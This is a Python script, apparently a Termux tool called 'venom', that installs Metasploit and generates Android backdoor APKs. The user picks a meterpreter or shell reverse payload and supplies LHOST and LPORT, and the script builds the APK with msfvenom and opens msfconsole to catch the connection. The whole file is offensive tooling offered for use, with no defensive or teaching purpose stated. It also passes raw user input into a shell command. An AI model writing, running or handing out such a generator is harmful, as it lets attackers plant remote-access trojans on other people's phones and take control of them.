#!/usr/bin/env python3
# Coded : Zettamus © 2019
# Contact me on WA : 081242873775
# Contact me on Telegram : t.me/zettamus
# Codenya berantakan :v
# RECODE? Silahkan, but jgn hapus nama author di atas_-
# Version : 1.1

# Import Module :
import os,time, getpass, socket, requests,sys,random


# Colours :
Y = '\033[93m' # Yellow
C = '\033[1;36m' # Cyan
G = '\x1b[32m' # Green
R = '\033[31;1m' # Red
W = '\x1b[1;97m' # White 
g = '\033[90m' # Grey
r = "\033[0m" # Reset

# Setting :
getpass=getpass.getpass
os=os.system
sleep=time.sleep
os('dpkg --configure -a')
os('clear')
try:
    versi='1.2'
    requp=requests.get('https://raw.githubusercontent.com/zettamus/backdoor/master/README.md').text
    if versi in str(requp):
        up='[99] Update '
        update=g+'['+C+'*'+g+'] Updating venom tools...'
        ver='[!] New version is available. Update now'
except: pass

def tik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(random.random() * 0.1)

# BANNER #
def banner():
    print(C+'''



            db.  .db d88888b  d8b   db   .d88b.  .88b  d88.
            88'  '88 88       888o  88  .8P  Y8. 88'YbdP`88
            Y8    8P 88ooooo  88V8o 88  88    88 88  88  88
            `8b  d8' 88       88 V8o88  88    88 88  88  88
              8bd8   88.      88  V888  `8b  d8' 88  88  88
               YP    Y88888P  VP   V8P   `Y88P   YP  YP  YP
                        ------MONO[X]PLOIT------
                           BACKDOOR METASPLOIT
                               GEN3RATOR
   ''')
    print(g+'['+C+'A'+g+']uthor : '+G+'Zettamus      '+g+'['+C+'V'+g+']ersion :'+G+' 1.1')
    print(g+'['+C+'G'+g+']ithub : '+G+'Github.com/zettamus'+r)
    try:
        tik('\n'+ver)
    except:
        print()
        pass

# IP ADDRESS #
def ip():
    host=socket.gethostname()
    print(g+'['+C+'*'+g+'] Hostname : '+host)
    try:
        print(g+'['+C+'*'+g+'] IP Address : '+socket.gethostbyname('google.com'))
    except socket.gaierror:
        tik(g+'['+R+'!'+g+'] IP Address : No connection')
        getpass(g+'['+R+'!'+g+'] This tools required  internet\n'+g+'['+R+'!'+g+'] Prees [Enter] to Continue but functions may not work properly')


# Check Metasploit #
banner()
tik(g+'['+C+'*'+g+'] Checking Metasploit')
sleep(2)
msf=os('which msfconsole > /dev/null 2>&1')
if msf == 0:
    print(g+'['+C+'*'+g+'] Metasploit Found')
    getpass(g+'['+C+'*'+g+'] Press [Enter] to Continue ')
else:
    ins=input(g+'['+R+'!'+g+'] Metasploit Not Found \n\n['+R+'?'+g+'] Do you want to install ['+C+'Y'+g+'/'+C+'n'+g+'] : '+G)
    if ins =='':
        exit(g+'['+R+'!'+g+'] Exit: Ok!')
    elif ins in ['Y','y']:
        tanya=input(g+'['+R+'NOTE'+g+'] This installation requires +500Mb free space \n'+g+'['+R+'!'+g+'] Type "'+R+'Exit'+g+'" to exit and press ['+G+'Enter'+g+'] to Continue : '+G)
        if tanya in ['Exit','exit','EXIT']:
            exit(g+'['+R+'!'+g+'] User Exit!')
        else:
            try:
                print(g+'['+C+'*'+g+'] Update Termux..')
                sleep(2)
                os('apt-get update -y;apt-get upgrade -y')
                print(g+'['+C+'*'+g+'] Installing X11-Repository and Unstable-Repo... ')
                os('apt-get install x11-repo -y > /dev/null 2>&1;apt-get install unstable-repo -y > /dev/null 2>&1')
                tik( g+"["+C+"*"+g+"]  Metasploit Install.. \n\n["+R+"WARN"+g+"] Do not exit the terminal\n["+R+"WARN"+g+"] Don't do any surgery")
                getpass(g+'['+C+'*'+g+'] this takes 20 minutes or more, make sure your internet connection is stable '+g+'['+C+'*'+g+'] Press [Enter] to Continue ')
                io=os('apt-get install metasploit -y')
                if io==0:
                    lo=os('which msfconsole > /dev/null 2>&1')
                    if lo==0:
                        print(g+'['+C+'*'+g+'] Metasploit-Framework successfully installed in your device ')
                        tik(g+'['+C+'*'+g+'] Now,,,,,,,, you can run METASPLOIT with command msfconsole and msfvenom ')
                        getpass(g+'['+C+'*'+g+'] Press [Enter] to Continue ')
                        exit(os('python3 venom.py'))
                    else:
                        exit(g+'['+R+'!'+g+'] Sorry, Metasploit cannot be installed on your device \n[!] Contact me on WA : 081247483775')
                else:
                    exit(g+'['+R+'!'+g+'] Sorry, Metasploit cannot be installed on your device \n[!] Contact me on WA : 081247483775')
            except KeyboardInterrupt:
                tik(g+'\n['+R+'!'+g+'] Ctrl - C Detected \n'+g+'['+R+'!'+g+'] Stopped all ')
                os('dpkg --configure -a')
                exit()
    else:
        exit(g+'['+R+'!'+g+'] User Exit!')
os('clear')


# MENU VENOM #
def menu():
    banner()
    ip()
    print()
    print(g+'['+C+'01'+g+'] Create Backdoor ')
    print(g+'['+C+'02'+g+'] Jump to msfconsole')
    try:
        tik(up)
    except: pass
    print(g+'['+R+'00'+g+'] Exit')
    try:
        zett=input(g+'\n['+R+'##'+g+'] Zettamus'+Y+'/> '+G)
    except KeyboardInterrupt:
        exit(g+'['+R+'!'+g+'] Key Interrupt : Exit!')
    if zett =='':
        exit(g+'\n['+R+'!'+g+'] Dont be empty')
    elif zett in ['1','01']:
        backdoor()
    elif zett in ['2','02']:
        msf()
    elif zett in ['0','00']:
        exit(tik(g+'\n['+R+'!'+g+'] VENOM TOOLS : EASY TO USE'))
    elif zett == '99':
        try:
            tik(update)
            print(g+'['+C+'*'+g+'] Please Wait..')
            os('cd ..;rm -rf backdoor')
            os('cd ..;git clone https://github.com/zettamus/backdoor > /dev/null 2>&1')
            tik( g+'['+C+'*'+g+'] Update Successfully ')
            exit(os('..;cd backdoor;python3 venom.py'))
        except:
            exit(tik(g+'['+C+'*'+g+'] Your venom is the latest version'))
    else:
        exit(g+'\n['+R+'!'+g+'] Wrong input ')

# MENU BACKDOOR #
def backdoor():
    print(g+'\n['+C+'*'+g+'] Choose Your method\n\n['+C+'1'+g+'] android/meterpreter/reverse_https\n['+C+'2'+g+'] android/meterpreter/reverse_http\n['+C+'3'+g+'] android/meterpreter/reverse_tcp\n['+C+'4'+g+'] android/shell/reverse_https\n['+C+'5'+g+'] android/shell/reverse_http\n['+C+'6'+g+'] android/shell/reverse_tcp')
    co=input('[#] Zettamus'+Y+'/> '+G)
    if co =='':
        exit('['+R+'!'+g+'] Dont be empty')
    elif co in ['1','01']:
        method='android/meterpreter/reverse_https'
    elif co in ['2','02']:
        method='android/meterpreter/reverse_http'
    elif co in ['3','03']:
        method='android/meterpreter/reverse_tcp'
    elif co in ['4','04']:
        method='android/shell/reverse_https'
    elif co in ['5','05']:
        method='android/shell/reverse_http'
    elif co in ['6','06']:
        method='android/shell/reverse_tcp'
    else: exit(g+'['+R+'!'+g+'] Wrong Input ')
    lhost=input(g+'['+R+'?'+g+'] LHOST : '+G)
    if lhost =='':
        exit(g+'['+R+'!'+g+'] Dont be empty')
    lport=input(g+'['+R+'?'+g+'] LPORT : '+G)
    if len(lport) < 4:
        exit(g+'['+R+'!'+g+'] Exit : LPORT must be 4 digit')
    elif lport =='':
        exit(g+'['+R+'!'+g+'] Dont be empty')
    nama=input(g+'['+R+'?'+g+'] Payload name : '+G)
    if nama =='':
        exit(g+'['+R+'!'+g+'] Dont be empty')
    elif '.apk' in nama:
        pass
    else:
        nama=nama+'.apk'
    print(g+'['+C+'*'+g+'] Running Proccess ')
    print(g+'['+C+'*'+g+'] Creating Payload with lhost',C+lhost+g,'and lport',G+lport)
    cr=os('msfvenom -p '+method+' LHOST='+lhost+' LPORT='+lport+' -o /data/data/com.termux/files/home/backdoor/'+nama+' > /dev/null 2>&1')
    if cr == 0:
        tik(g+'['+C+'*'+g+'] Succesfully creating backdoor payload\n'+g+'['+C+'*'+g+'] Payload saved it : '+G+'home/backdoor/'+nama)
    else:
        exit(g+'['+R+'!'+g+'] Error When Create backdoor')
    msf=input('[?] Do you want to jump to msfconsole [Y/n] : ')
    if msf in ['Y','y']:
        print(g+'['+C+'*'+g+'] Running Postgresql')
        os('pg_ctl -D $PREFIX/var/lib/postgresql start > /dev/null 2>&1')
        print(g+'['+C+'*'+g+'] Running msfconsole ')
        exit(os('msfconsole'))
    else:
        exit(g+'['+R+'!'+g+'] Exit: Ok!')
def msf():
    print(g+'['+C+'*'+g+'] Running Postgresql')
    os('pg_ctl -D $PREFIX/var/lib/postgresql start > /dev/null 2>&1')
    print(g+'['+C+'*'+g+'] Running msfconsole ')
    exit(os('msfconsole'))
if __name__ == '__main__':
    menu()
